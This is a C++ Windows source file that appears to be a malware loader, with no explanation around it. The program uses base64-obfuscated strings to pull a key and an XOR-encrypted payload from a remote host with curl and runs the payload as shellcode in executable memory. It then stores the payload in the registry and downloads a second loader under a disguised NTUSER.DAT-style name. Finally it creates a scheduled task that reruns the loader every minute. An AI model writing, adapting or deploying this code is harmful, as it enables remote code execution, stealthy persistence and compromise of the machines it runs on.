#include <windows.h>
#include <vector>
#include <string>
#include <sstream>
#include <shlobj.h>

std::string b64Decode(const std::string& encoded) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string decoded;
    std::vector<int> table(256, -1);
    for (int i = 0; i < 64; ++i) table[chars[i]] = i;
    int val = 0, valb = -8;
    for (unsigned char c : encoded) {
        if (table[c] == -1) continue;
        val = (val << 6) + table[c];
        valb += 6;
        if (valb >= 0) {
            decoded.push_back(char((val >> valb) & 0xFF));
            valb -= 8;
        }
    }
    return decoded;
}

std::string getUserDir() {
    char path[MAX_PATH];
    if (SHGetFolderPathA(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK) {
        return std::string(path);
    }
    return "";
}

void runCmd(const std::string& cmd) {
    FILE* pipe = _popen(cmd.c_str(), "r");
    if (pipe) _pclose(pipe);
}

void moveLoader(const std::string& loaderUrl) {
    std::string userDir = getUserDir();
    if (userDir.empty()) return;

    std::string loaderPath = userDir + "\\NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.exe";
    std::string cmd = "curl -k -s -o \"" + loaderPath + "\" " + loaderUrl;
    runCmd(cmd);
}

void storePayload(const std::vector<unsigned char>& payload) {
    HKEY hKey;
    if (RegCreateKeyEx(HKEY_CURRENT_USER, b64Decode("U29mdHdhcmVcTWFsaWNpb3VzQXBw").c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_SET_VALUE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
        RegSetValueEx(hKey, b64Decode("UGF5bG9hZA==").c_str(), 0, REG_BINARY, payload.data(), payload.size());
        RegCloseKey(hKey);
    }
}

void createTask() {
    std::string userDir = getUserDir();
    if (userDir.empty()) return;

    std::string loaderPath = userDir + "\\NTUSER.DAT{53b39e88-18c4-11ea-a811-000d3aa4692b}.TMContainer00000000000000000002.exe";
    std::string cmd = "schtasks /create /tn \"" + b64Decode("Q3VzdG9tVGFza0V2ZXJ5TWludXRl") +
                      "\" /tr \"" + loaderPath + "\" /sc minute /mo 1 /f";
    runCmd(cmd);
}

void xorDecrypt(unsigned char* data, size_t size, unsigned char key) {
    for (size_t i = 0; i < size; ++i) {
        data[i] ^= key;
    }
}

void execShellcode(unsigned char* shellcode, size_t size) {
    void* mem = VirtualAlloc(0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return;
    memcpy(mem, shellcode, size);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    std::string keyUrl = b64Decode("aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9waXp6YS50eHQ=");
    std::string payloadUrl = b64Decode("aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9mdW4uYmlu");
    std::string loaderUrl = b64Decode("aHR0cHM6Ly8xOTIuMTY4LjEzNy4xNTY6ODQ0My9sb2FkZXIuZXhl");
    std::string curlBase = b64Decode("Y3VybCAtayAtcyA=");
    std::string authHeaderBase = b64Decode("QXV0aG9yaXphdGlvbjogQmVhcmVyIA==");

    std::string cmd = curlBase + " " + keyUrl;
    char buf[128];
    FILE* pipe = _popen(cmd.c_str(), "r");
    std::string secretKeyStr;
    if (pipe) {
        while (fgets(buf, sizeof(buf), pipe)) {
            secretKeyStr += buf;
        }
        _pclose(pipe);
    }
    if (secretKeyStr.empty()) return 1;

    secretKeyStr.erase(secretKeyStr.find_last_not_of("\n\r ") + 1);
    unsigned char key = static_cast<unsigned char>(std::stoi(secretKeyStr));

    cmd = curlBase + " -H \"" + authHeaderBase + secretKeyStr + "\" " + payloadUrl;
    std::string payloadData;
    pipe = _popen(cmd.c_str(), "r");
    if (pipe) {
        while (fgets(buf, sizeof(buf), pipe)) {
            payloadData += buf;
        }
        _pclose(pipe);
    }
    if (payloadData.empty()) return 1;

    std::vector<unsigned char> payload(payloadData.begin(), payloadData.end());
    xorDecrypt(payload.data(), payload.size(), key);
    execShellcode(payload.data(), payload.size());

    storePayload(payload);
    moveLoader(loaderUrl);
    createTask();

    return 0;
}
